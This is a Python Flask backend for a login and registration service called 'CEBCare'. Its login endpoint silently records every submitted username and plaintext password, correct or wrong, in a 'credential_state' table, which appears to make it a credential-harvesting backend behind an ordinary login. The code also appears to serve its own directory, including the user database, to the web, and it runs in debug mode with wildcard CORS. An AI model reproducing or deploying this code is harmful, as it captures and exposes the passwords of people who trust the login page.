from flask import Flask, request, jsonify, send_from_directory
import os
import sqlite3
import hashlib

app = Flask(__name__, static_folder='.', static_url_path='')
DB_FILE = 'users.db'

# Initialize the database
def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credential_state (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            state TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()
    print("Database initialized successfully.")

# Serve frontend index.html on root path
@app.route('/')
def home():
    return send_from_directory('.', 'index.html')

# Register endpoint
@app.route('/api/register', methods=['POST'])
def handle_register():
    try:
        req = request.get_json()
        if not req:
            return jsonify({"success": False, "message": "Invalid JSON format."}), 400
            
        username = req.get('username', '').strip()
        password = req.get('password', '')
        
        if not username or not password:
            return jsonify({"success": False, "message": "Username and password are required."}), 400
        
        if len(username) < 3:
            return jsonify({"success": False, "message": "Username must be at least 3 characters long."}), 400
        
        if len(password) < 4:
            return jsonify({"success": False, "message": "Password must be at least 4 characters long."}), 400

        hashed_pw = hashlib.sha256(password.encode('utf-8')).hexdigest()
        
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        try:
            cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, hashed_pw))
            conn.commit()
            return jsonify({"success": True, "message": "Registration successful! You can now log in."}), 201
        except sqlite3.IntegrityError:
            return jsonify({"success": False, "message": "Username already exists."}), 400
        finally:
            conn.close()
            
    except Exception as e:
        return jsonify({"success": False, "message": f"Server error: {str(e)}"}), 500

# Login endpoint
@app.route('/api/login', methods=['POST'])
def handle_login():
    try:
        req = request.get_json()
        if not req:
            return jsonify({"success": False, "message": "Invalid JSON format."}), 400
            
        username = req.get('username', '').strip()
        password = req.get('password', '')
        
        if not username or not password:
            return jsonify({"success": False, "message": "Username and password are required."}), 400

        hashed_pw = hashlib.sha256(password.encode('utf-8')).hexdigest()
        
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("SELECT password FROM users WHERE username = ?", (username,))
        row = cursor.fetchone()
        
        state = 'correct' if (row and row[0] == hashed_pw) else 'wrong'
        
        # Log the login attempt in the credential_state table
        cursor.execute(
            "INSERT INTO credential_state (username, password, state) VALUES (?, ?, ?)",
            (username, password, state)
        )
        conn.commit()
        conn.close()
        
        if state == 'correct':
            return jsonify({"success": True, "message": "Login successful! Welcome to CEBCare."}), 200
        else:
            return jsonify({"success": False, "message": "Invalid username or password."}), 401
            
    except Exception as e:
        return jsonify({"success": False, "message": f"Server error: {str(e)}"}), 500

# Add CORS headers so GitHub Pages frontend can communicate with the backend
@app.after_request
def add_cors_headers(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

if __name__ == '__main__':
    init_db()
    # Local execution
    app.run(host='0.0.0.0', port=8000, debug=True)
